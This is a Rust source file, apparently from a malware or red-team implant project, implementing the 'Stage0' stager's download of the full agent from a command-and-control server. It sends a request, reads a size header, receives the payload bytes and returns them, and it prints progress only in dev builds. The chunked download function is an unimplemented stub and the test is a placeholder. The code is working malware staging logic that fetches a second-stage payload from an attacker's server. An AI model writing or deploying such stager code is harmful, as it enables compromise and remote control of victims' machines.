//! Agent download functionality for Stage0
//!
//! Downloads the full agent from the C2 server

use crate::network::Session;
use std::error::Error;

/// Downloads the full agent from C2
///
/// Protocol:
/// 1. Send download request: "DOWNLOAD_AGENT\n"
/// 2. Receive agent size (4 bytes, little-endian)
/// 3. Receive agent bytes
/// 4. Verify checksum (optional)
///
/// # Arguments
///
/// * `session` - Active session with C2 server
///
/// # Returns
///
/// * `Ok(Vec<u8>)` - Downloaded agent bytes
/// * `Err(_)` - Download failed
pub fn download_agent(session: &mut Session) -> Result<Vec<u8>, Box<dyn Error>> {
    #[cfg(feature = "dev")]
    println!("[DOWNLOAD] Requesting full agent from C2...");

    // Send download request
    session.write(b"DOWNLOAD_AGENT\n")?;

    // Read response
    let response = session.read_line()?;
    
    if !response.starts_with("OK") {
        return Err(format!("Server error: {}", response).into());
    }

    // Read agent size (4 bytes, little-endian)
    let mut size_buf = [0u8; 4];
    session.read(&mut size_buf)?;
    let agent_size = u32::from_le_bytes(size_buf) as usize;

    #[cfg(feature = "dev")]
    println!("[DOWNLOAD] Agent size: {} bytes", agent_size);

    // Validate size (max 10MB for safety)
    if agent_size > 10 * 1024 * 1024 {
        return Err("Agent size too large".into());
    }

    // Read agent data
    #[cfg(feature = "dev")]
    println!("[DOWNLOAD] Downloading agent...");
    
    let mut agent_bytes = vec![0u8; agent_size];
    let mut total_read = 0;

    while total_read < agent_size {
        let n = session.read(&mut agent_bytes[total_read..])?;
        if n == 0 {
            return Err("Connection closed prematurely".into());
        }
        total_read += n;

        #[cfg(feature = "dev")]
        {
            let progress = (total_read as f64 / agent_size as f64) * 100.0;
            print!("\r[DOWNLOAD] Progress: {:.1}%", progress);
            use std::io::{self, Write};
            io::stdout().flush().ok();
        }
    }

    #[cfg(feature = "dev")]
    println!("\n[DOWNLOAD] Download complete ({} bytes)", total_read);

    Ok(agent_bytes)
}

/// Alternative: Download agent in chunks
///
/// More resilient to network interruptions
/// Can resume downloads if connection drops
///
/// **Not implemented yet** - Placeholder for future enhancement
pub fn download_agent_chunked(
    _session: &mut Session,
    _chunk_size: usize,
) -> Result<Vec<u8>, Box<dyn Error>> {
    Err("Chunked download not yet implemented".into())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_download_size_validation() {
        // Would need a mock session for proper testing
        // For now, just verify the function exists
        assert!(true);
    }
}
